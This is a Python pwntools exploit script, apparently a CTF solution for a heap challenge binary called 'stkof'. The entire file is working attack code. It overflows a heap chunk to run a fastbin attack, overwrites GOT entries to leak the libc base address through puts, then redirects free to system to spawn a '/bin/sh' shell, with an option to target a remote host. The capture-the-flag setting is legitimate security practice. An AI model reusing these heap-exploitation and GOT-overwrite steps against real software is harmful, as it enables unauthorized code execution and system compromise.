#!/usr/bin/env python
# coding=utf-8
# author: thinkycx
# date: 2018-11-29
from pwn import *
context.local(arch='amd64', os='linux')

def create(size):
    io.sendline("1")
    io.sendline(unicode(size))

def input(number, size, payload):
    io.sendline("2")
    io.sendline(unicode(number))
    io.sendline(unicode(size))
    # assert len(payload) == size
    io.send(payload) # send for read , should not use sendline ,sendline is both ok, \n will be left for main

def delete(number):
    io.sendline("3")
    io.sendline(unicode(number))

def pwn(io):
    log.info("[1] malloc 0x30 times ")
    # binary don't have setbuf , heap looks like : gets's chunk, first user malloc chunk, printf's chunk
    create(0x400) # 1 first chunk in data[] number is 1 ;because ++malloc_times
    
    for i in range(0x2f):
        create(0x20)

    log.info("[2] free chunk3 , overflow chunk3'fd , fastbin attack ")
    delete(3)
    # gdb.attach(io,'break *0x400C85') # 0x0000000000400C85 atoi in main
    payload = 0x28*"a" + p64(0x31) + p64(0x0000000000602100-8) 
    input(2, len(payload), payload)
    create(0x20) # 0x31

    create(0x20) # 0x32

    # gdb.attach(io,'break *0x400C85') # 0x0000000000400C85 atoi in main
    log.success("fastbin attach success! we can arbitrary write now!")

    log.info("[3] write puts@plt into free@got and call puts(puts@got)")
    #                                         1               2                3               4 
    payload2_globalptr = p64(0)*8  + p64(elf.got['free']) + p64(0xdeadbeaf) + p64(elf.got['puts']) + p64(0x400DEC) # //TODO
    input(0x32, len(payload2_globalptr), payload2_globalptr)
    input(1, 8, p64(elf.plt['puts']))
    delete(4) # puts("//TODO")
    delete(3) # puts(puts@got)

    io.recvuntil("//TODO\nOK\n")
    libc.address = u64(io.recv(6)+"\x00\x00") - libc.symbols['_IO_puts']
    log.success("glibc address base @ 0x%x",libc.address )

    log.info("[4] write &system into free@got and call system(\"/bin/sh\")")
    payload3_globalptr = p64(0)*8+ p64(elf.got['free']) + p64(0xdeadbeaf) + p64(0x602160) + "/bin/sh\x00"
    input(0x32, len(payload3_globalptr), payload3_globalptr)
    input(1, 8, p64(libc.symbols['system']))
    delete(3) # system("/bin/sh")


if __name__ == '__main__':
    global io, elf, libc, debug
    local, debug = 1, 0
    # context.log_level = 'debug'
    filename = './stkof'
    elf = ELF(filename)
    if local:
        # socat tcp-l:10002,fork exec:./filename
        io = process(filename)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        context.terminal = ['tmux', 'splitw', '-h' ]
    else:
        io = remote("ip",10001)
    pwn(io)
    io.interactive()
